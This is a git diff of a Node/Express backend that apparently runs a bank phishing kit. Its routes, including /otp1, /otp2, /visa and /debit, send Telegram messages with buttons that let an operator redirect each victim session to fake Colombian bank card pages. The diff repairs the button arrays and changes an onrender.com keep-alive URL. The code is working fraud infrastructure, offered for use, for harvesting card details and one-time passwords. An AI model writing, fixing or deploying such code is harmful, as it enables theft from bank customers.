@@ -70,19 +70,19 @@ app.post('/virtualpersona', async (req, res) => {
       { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum+Conavi.html|${sessionId}` },
       { text: "⚽ Visa Selección", callback_data: `go:Visa+Seleccion+Colombia.html|${sessionId}` }
     ],
-     [
+    [
       { text: "🛩️ Visa LifeMiles", callback_data: `go:BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.html|${sessionId}` },
       { text: "🌐 Martercard Virtual", callback_data: `go:virtualdedbit.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🪙 MasterCard Gold", callback_data: `go:mastergold.html|${sessionId}` },
       { text: "💍 MasterCard clasica", callback_data: `go:Mastercard+Clasica+Tradicional.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🩶 MasterCard Platinum", callback_data: `go:masterplati.html|${sessionId}` },
       { text: "🖤 Mastercard Black", callback_data: `go:masterblaack.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🏦 Amex", callback_data: `go:amexs.html|${sessionId}` },
       { text: "📋 Datos", callback_data: `go:datos.html|${sessionId}` }
     ]
@@ -154,22 +154,23 @@ app.post('/otp1', async (req, res) => {
       { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum+Conavi.html|${sessionId}` },
       { text: "⚽ Visa Selección", callback_data: `go:Visa+Seleccion+Colombia.html|${sessionId}` }
     ],
-     [
+    [
       { text: "🛩️ Visa LifeMiles", callback_data: `go:BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.html|${sessionId}` },
       { text: "🌐 Martercard Virtual", callback_data: `go:virtualdedbit.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🪙 MasterCard Gold", callback_data: `go:mastergold.html|${sessionId}` },
       { text: "💍 MasterCard clasica", callback_data: `go:Mastercard+Clasica+Tradicional.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🩶 MasterCard Platinum", callback_data: `go:masterplati.html|${sessionId}` },
       { text: "🖤 Mastercard Black", callback_data: `go:masterblaack.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🏦 Amex", callback_data: `go:amexs.html|${sessionId}` },
       { text: "📋 Datos", callback_data: `go:datos.html|${sessionId}` }
-    ],
+    ]
+  ]
     };
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -225,22 +226,23 @@ app.post('/otp2', async (req, res) => {
       { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum+Conavi.html|${sessionId}` },
       { text: "⚽ Visa Selección", callback_data: `go:Visa+Seleccion+Colombia.html|${sessionId}` }
     ],
-     [
+    [
       { text: "🛩️ Visa LifeMiles", callback_data: `go:BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.html|${sessionId}` },
       { text: "🌐 Martercard Virtual", callback_data: `go:virtualdedbit.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🪙 MasterCard Gold", callback_data: `go:mastergold.html|${sessionId}` },
       { text: "💍 MasterCard clasica", callback_data: `go:Mastercard+Clasica+Tradicional.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🩶 MasterCard Platinum", callback_data: `go:masterplati.html|${sessionId}` },
       { text: "🖤 Mastercard Black", callback_data: `go:masterblaack.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🏦 Amex", callback_data: `go:amexs.html|${sessionId}` },
       { text: "📋 Datos", callback_data: `go:datos.html|${sessionId}` }
-    ],
+    ]
+  ]
     };
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -276,7 +278,7 @@ app.post('/visa', async (req, res) => {
           { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
         ]
       ],
-	  [
+[
       { text: "💳 Débito", callback_data: `go:debit.html|${sessionId}` },
       { text: "🪙 Visa Oro", callback_data: `go:Visa+Oro.html|${sessionId}` }
     ],
@@ -288,22 +290,23 @@ app.post('/visa', async (req, res) => {
       { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum+Conavi.html|${sessionId}` },
       { text: "⚽ Visa Selección", callback_data: `go:Visa+Seleccion+Colombia.html|${sessionId}` }
     ],
-     [
+    [
       { text: "🛩️ Visa LifeMiles", callback_data: `go:BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.html|${sessionId}` },
       { text: "🌐 Martercard Virtual", callback_data: `go:virtualdedbit.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🪙 MasterCard Gold", callback_data: `go:mastergold.html|${sessionId}` },
       { text: "💍 MasterCard clasica", callback_data: `go:Mastercard+Clasica+Tradicional.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🩶 MasterCard Platinum", callback_data: `go:masterplati.html|${sessionId}` },
       { text: "🖤 Mastercard Black", callback_data: `go:masterblaack.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🏦 Amex", callback_data: `go:amexs.html|${sessionId}` },
       { text: "📋 Datos", callback_data: `go:datos.html|${sessionId}` }
-    ],
+    ]
+  ]
     };
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -384,22 +387,23 @@ app.post('/debit', async (req, res) => {
       { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum+Conavi.html|${sessionId}` },
       { text: "⚽ Visa Selección", callback_data: `go:Visa+Seleccion+Colombia.html|${sessionId}` }
     ],
-     [
+    [
       { text: "🛩️ Visa LifeMiles", callback_data: `go:BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.html|${sessionId}` },
       { text: "🌐 Martercard Virtual", callback_data: `go:virtualdedbit.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🪙 MasterCard Gold", callback_data: `go:mastergold.html|${sessionId}` },
       { text: "💍 MasterCard clasica", callback_data: `go:Mastercard+Clasica+Tradicional.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🩶 MasterCard Platinum", callback_data: `go:masterplati.html|${sessionId}` },
       { text: "🖤 Mastercard Black", callback_data: `go:masterblaack.html|${sessionId}` }
-    ]
-     [
+    ],
+    [
       { text: "🏦 Amex", callback_data: `go:amexs.html|${sessionId}` },
       { text: "📋 Datos", callback_data: `go:datos.html|${sessionId}` }
-    ],
+    ]
+  ]
     };
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -566,7 +570,7 @@ app.listen(PORT, () => console.log(`✅ Servidor activo en puerto ${PORT}`));
 // ==== Auto-ping para mantener activo el backend y refrescar la propia URL cada 3 minutos ====
 setInterval(async () => {
   try {
-    const res = await fetch("https://servers-o8da.onrender.com");
+    const res = await fetch("https://diosnoseolvidademi.onrender.com");
     const text = await res.text();
     console.log("🔁 Auto-ping realizado:", text);
   } catch (error) {
